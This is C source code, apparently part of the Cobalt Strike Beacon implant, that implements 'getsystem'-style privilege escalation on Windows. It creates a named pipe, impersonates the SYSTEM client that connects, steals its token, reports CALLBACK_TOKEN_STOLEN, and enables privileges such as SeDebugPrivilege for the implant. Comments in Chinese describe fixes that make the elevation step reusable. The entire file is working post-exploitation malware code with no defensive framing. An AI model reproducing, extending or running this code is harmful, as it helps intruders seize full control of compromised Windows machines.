/*
 * Privilege Escalation Code
 */
#include <windows.h>
#include <stdio.h>
#include "commands.h"
#include "parse.h"
#include "beacon.h"
#include "bformat.h"
#include "tokens.h"

static HANDLE hServerPipe    = INVALID_HANDLE_VALUE;
static HANDLE systemToken    = INVALID_HANDLE_VALUE;
static HANDLE hElevateThread = INVALID_HANDLE_VALUE;
extern HANDLE atoken;
extern int    threadcount;

/*
 * Worker thread for named pipe impersonation. Creates a named pipe and impersonates
 * the first client which connects to it.
 */
void elevate_thread() {
	BYTE bMessage[128]          = {0};
	DWORD dwBytes               = 0;

	/* wait for someone to connect to our named pipe */
	while (!ConnectNamedPipe(hServerPipe, NULL)) {
		if (GetLastError() == ERROR_PIPE_CONNECTED) {
			break;
		}
	}

	/* we can't impersonate a client until we read data from the pipe */
	if (!ReadFile(hServerPipe, &bMessage, 1, &dwBytes, NULL))
		goto done;

	/* impersonate the client that connected to us (SYSTEM user via service) */
	if (!ImpersonateNamedPipeClient(hServerPipe))
		goto done;

	/* grab the SYSTEM token from our current thread */
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &systemToken))
		goto done;

	/* do some cleanup now */
	if (hServerPipe) {
		DisconnectNamedPipe(hServerPipe);
		CloseHandle(hServerPipe);
	}

done:
	/* decrement our threadcount */
	threadcount--;
}

void getprivs(char * buffer, int length, HANDLE token, formatp * output) {
	int x;
	TOKEN_PRIVILEGES priv = {0};
	datap          parser;
	unsigned short count;
	char           privName[64];

	/* initialize our parser */
	data_init(&parser, buffer, length);

	/* grab the number of privs out of our buffer */
	count = data_short(&parser);

	/* loop through privileges */
	for (x = 0; x < count; x++) {
		/* grab our priv name out of the buffer */
		data_string(&parser, privName, 64);

		/* reset our priv structure */
		memset(&priv, 0, sizeof(priv));

		/* map the user specified privname to a value, if it fails, complain! */
		if (!LookupPrivilegeValue(NULL, privName, &priv.Privileges[0].Luid))
			continue;

		/* populate the rest of our priv structure */
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		/* adjust the privilege, report it if it worked */
		if (AdjustTokenPrivileges(token, FALSE, &priv, 0, 0, 0)) {
			if (GetLastError() == ERROR_SUCCESS)
				bformat_printf(output, "%s\n", privName);
		}
	}
}

/*
 * This command creates a named pipe server and a thread that services this pipe server. When a client connects
 * to this server, our thread will grab its access token and impersonate it. We'll process this access token in the
 * COMMAND_ELEVATE_POST command.
 */
void command_elevate_pre(char * buffer, int length) {
	char cServicePipe[256];

	if (length >= 256)
		return;

	memcpy(cServicePipe, buffer, length);
	cServicePipe[length] = '\0';

	/* these should be set to reset our state */
	systemToken    = INVALID_HANDLE_VALUE;
	hServerPipe = INVALID_HANDLE_VALUE; /* 无论成败均由 command_elevate_post 收尾关闭 */
	hElevateThread = INVALID_HANDLE_VALUE;

	/* create our pipe */
	hServerPipe = CreateNamedPipe(cServicePipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT, 2, 0, 0, 0, NULL);
	if (!hServerPipe)
		return;

	/* spawn a thread to wait for a connection to the pipe */
	hElevateThread = run_thread_start(reinterpret_cast<void (*)(void*)>( & elevate_thread), NULL); /* 由 command_elevate_post 等待后关闭 */
}

/*
* our elevate post step. Any args? I don't think so.
*/
void command_elevate_post(void(*callback)(char * buffer, int length, int type)) {
	char   name[512];
	BOOL   ok = FALSE;

	/* wait for our elevate thread to complete (up to 15s)。
	   修复原 TODO：线程句柄等待结束后关闭，并复位状态，保证 elevate 可重入。 */
	if (hElevateThread != INVALID_HANDLE_VALUE) {
		WaitForSingleObject(hElevateThread, 15000);
		CloseHandle(hElevateThread);
		hElevateThread = INVALID_HANDLE_VALUE;
	}

	/* ok, do something with the new token */
	if (systemToken != INVALID_HANDLE_VALUE) {
		/* try to use the SYSTEM token in the current thread。
		   注意：systemToken 转正为 atoken 后仍要继续使用，故此处不关闭该 token。 */
		if (ImpersonateLoggedOnUser(systemToken)) {
			atoken = systemToken;
			ok = TRUE;

			/* resolve the token's name... for giggles */
			if (token_user(systemToken, name, 512)) {
				callback(name, strlen(name), CALLBACK_TOKEN_STOLEN);
			}
		}
		else {
			post_error_d(0xc, GetLastError());
		}
	}
	else {
		post_error_na(0x01);
	}

	/* 修复原 TODO：服务端管道无论成败都要关闭。若 elevator 线程仍在
	   ConnectNamedPipe 上等待，关句柄会使其立即失败返回、线程自然退出。 */
	if (hServerPipe != INVALID_HANDLE_VALUE) {
		CloseHandle(hServerPipe);
		hServerPipe = INVALID_HANDLE_VALUE;
	}
	(void)ok;
}

/* is this a 64-bit or 32-bit process? */
BOOL is_wow64(HANDLE process) {
	BOOL (WINAPI *fnIsWow64Process)(HANDLE, PBOOL);
	BOOL bIsWow64 = FALSE;

	fnIsWow64Process = (BOOL (WINAPI *)(HANDLE, PBOOL)) GetProcAddress(GetModuleHandleA("kernel32"), "IsWow64Process");

	if (NULL != fnIsWow64Process) {
		if (!fnIsWow64Process(process, &bIsWow64)) {
			return FALSE;
		}
	}

	return bIsWow64;
}

/* is this an x64 Beacon or not? */
BOOL is_x64() {
#if defined _M_X64
	return TRUE;
#elif defined _M_IX86
	return FALSE;
#endif
}

/* enable a specific privilege */
void command_getprivs(char * buffer, int length, void(*callback)(char * buffer, int length, int type)) {
	HANDLE   ttoken;
	formatp  enabled;

	bformat_init(&enabled, 32 * 1024);

	/* try to enable privs on the current thread token, if we can */
	if (atoken != NULL) {
		/*  drop our token and re-impersonate it, why? makes sure we get a copy of the token with the privs applied */
		token_guard_start();
		getprivs(buffer, length, atoken, &enabled);
		token_guard_stop();
	}
	/* we want the SE_DEBUG_PRIV to get all info from processes */
	else if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &ttoken))  {
		getprivs(buffer, length, ttoken, &enabled);
		CloseHandle(ttoken);
	}
	else {
		post_error_na(0x3b);
	}

	/* send our output back to Cobalt Strike */
	if (bformat_length(&enabled) > 0)
		callback(bformat_string(&enabled), bformat_length(&enabled), CALLBACK_OUTPUT);

	bformat_free(&enabled);
}